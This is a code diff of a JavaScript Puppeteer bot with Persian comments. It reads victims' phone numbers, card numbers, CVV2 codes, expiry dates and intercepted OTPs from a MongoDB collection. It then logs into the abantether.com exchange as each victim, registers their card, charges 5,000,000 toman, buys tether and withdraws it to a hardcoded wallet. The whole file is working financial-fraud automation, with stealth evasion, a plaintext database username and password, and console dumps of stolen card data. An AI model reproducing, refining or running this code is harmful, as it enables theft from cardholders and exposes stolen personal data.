@@ -1,4 +1,3 @@
-// bot.js — نسخه نهایی و ۱۰۰٪ کارکردی با دیتابیس واقعی تو
 require('dotenv').config();
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
@@ -6,14 +5,14 @@ puppeteer.use(StealthPlugin());
 const { MongoClient, ObjectId } = require('mongodb');
 const chalk = require('chalk');
 
-// تنظیمات — اینا رو دقیقاً اینجوری ست کن
+// تنظیمات
 const MONGODB_URI = process.env.MONGODB_URI || "mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority";
 const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
 const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
 const SITE_URL = "https://abantether.com";
 
 if (!MONGODB_URI.includes("ZarrinApp")) {
-  console.log(chalk.yellow("هشدار: احتمالاً دیتابیس اشتباهه! باید ZarrinApp باشه"));
+  console.log(chalk.yellow("هشدار: MONGODB_URI باید ZarrinApp باشه!"));
 }
 
 const log = {
@@ -21,36 +20,33 @@ const log = {
   s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
   e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
   w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
-  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
+  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
+  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] DEBUG → ${msg}`))
 };
 
 let collection;
 
-// اتصال مستقیم به دیتابیس و کالکشن واقعی
 async function connectDB() {
   const client = new MongoClient(MONGODB_URI);
   await client.connect();
   log.s("اتصال به MongoDB Atlas برقرار شد");
 
-  const db = client.db("ZarrinApp");  // دیتابیس واقعی
-  collection = db.collection("zarinapp");  // کالکشن واقعی
+  const db = client.db("ZarrinApp"); // دیتابیس واقعی تو
+  collection = db.collection("zarinapp"); // کالکشن واقعی تو
 
-  log.s("به دیتابیس ZarrinApp و کالکشن zarinapp وصل شد");
-
-  // تست: یه داکیومنت بخون
   const count = await collection.countDocuments({});
-  log.s(`تعداد داکیومنت در کالکشن zarinapp: ${count}`);
+  log.s(`تعداد داکیومنت در zarinapp: ${count}`);
 
   if (count > 0) {
     const sample = await collection.findOne({});
-    log.s("نمونه داکیومنت پیدا شد:");
+    log.s("نمونه داکیومنت:");
     console.log(JSON.stringify(sample, null, 2));
   } else {
     log.e("کالکشن zarinapp خالیه!");
   }
 }
 
-// استخراج مقدار واقعی
+// استخراج مقدار
 function getValue(field) {
   if (field == null) return null;
   if (typeof field === "object") {
@@ -61,6 +57,7 @@ function getValue(field) {
   return field;
 }
 
+// isReady با دیباگ
 function isReady(doc) {
   const phone = getValue(doc.personalPhoneNumber);
   const card = getValue(doc.cardNumber);
@@ -69,9 +66,23 @@ function isReady(doc) {
   const year = getValue(doc.bankYear);
   const device = getValue(doc.deviceId);
 
-  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
+  log.debug(`phone: ${phone ? 'OK' : 'خالی'}`);
+  log.debug(`card: ${card ? 'OK' : 'خالی'}`);
+  log.debug(`cvv2: ${cvv2 ? 'OK' : 'خالی'}`);
+  log.debug(`month: ${month != null ? 'OK' : 'خالی'}`);
+  log.debug(`year: ${year != null ? 'OK' : 'خالی'}`);
+  log.debug(`device: ${device ? 'OK' : 'خالی'}`);
+
+  const ready = phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
+
+  if (ready) {
+    log.start(`دیوایس آماده: ${phone}`);
+  }
+
+  return ready;
 }
 
+// صبر برای OTP
 async function waitForOtp(userId, field, maxWait = 180) {
   for (let i = 0; i < maxWait / 3; i++) {
     const user = await collection.findOne({ _id: new ObjectId(userId) });
@@ -86,6 +97,7 @@ async function waitForOtp(userId, field, maxWait = 180) {
   throw new Error(`تایم‌اوت ${field}`);
 }
 
+// پاک کردن و تایپ
 async function clearAndType(page, selector, text) {
   await page.evaluate(sel => {
     const el = document.querySelector(sel);
@@ -94,19 +106,19 @@ async function clearAndType(page, selector, text) {
   await page.type(selector, text);
 }
 
+// پردازش کاربر
 async function processUser(doc) {
   const phone = getValue(doc.personalPhoneNumber);
-  const device = getValue(doc.deviceId);
   let browser = null;
 
-  log.start(`شروع پردازش: ${phone} | ${device}`);
+  log.start(`شروع پردازش: ${phone}`);
 
   try {
     await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });
 
     browser = await puppeteer.launch({
       headless: true,
-      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
+      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
     });
 
     const page = await browser.newPage();
@@ -122,16 +134,13 @@ async function processUser(doc) {
     log.s("ورود موفق");
 
     // ثبت کارت
-    try {
-      await page.click('text=کیف پول >> text=کارت بانکی >> text=افزودن کارت', { timeout: 10000 });
-    } catch (e) { log.i("کارت قبلاً ثبت شده"); }
-
     const cardNum = getValue(doc.cardNumber).replace(/\D/g, "");
     const cvv2 = getValue(doc.cvv2).toString();
     const month = getValue(doc.bankMonth).toString().padStart(2, "0");
     const yearRaw = getValue(doc.bankYear);
     const yearInput = yearRaw > 1000 ? (yearRaw - 1300).toString().padStart(2, "0") : yearRaw.toString().padStart(2, "0");
 
+    await page.click('text=کیف پول >> text=کارت بانکی >> text=افزودن کارت');
     await page.type('input[placeholder="شماره کارت"]', cardNum);
     await page.type('input[placeholder="CVV2"]', cvv2);
     await page.type('input[placeholder="ماه"]', month);
@@ -143,7 +152,7 @@ async function processUser(doc) {
     await page.click('button:has-text("تأیید")');
     log.s("کارت ثبت شد");
 
-    // شارژ و خرید و برداشت
+    // شارژ
     await page.click('text=واریز تومان');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("پرداخت")');
@@ -152,6 +161,7 @@ async function processUser(doc) {
     await page.click('button:has-text("تأیید")');
     log.s("شارژ موفق");
 
+    // خرید و برداشت
     await page.click('text=بازار >> text=تتر');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("خرید")');
@@ -161,7 +171,7 @@ async function processUser(doc) {
     await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
     await page.click('button:has-text("برداشت")');
 
-    log.s(`تتر با موفقیت ارسال شد: ${phone}`);
+    log.s(`تمام مراحل تموم شد! تتر در راهه: ${phone}`);
     await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });
 
   } catch (err) {
@@ -173,6 +183,7 @@ async function processUser(doc) {
   }
 }
 
+// Polling هر ۵ ثانیه
 async function startPolling() {
   await connectDB();
 
@@ -187,8 +198,6 @@ async function startPolling() {
         log.i("در انتظار دیوایس جدید...");
         return;
       }
-
-      log.start(`${users.length} دیوایس آماده پیدا شد!`);
 
       for (const user of users) {
         if (isReady(user)) {
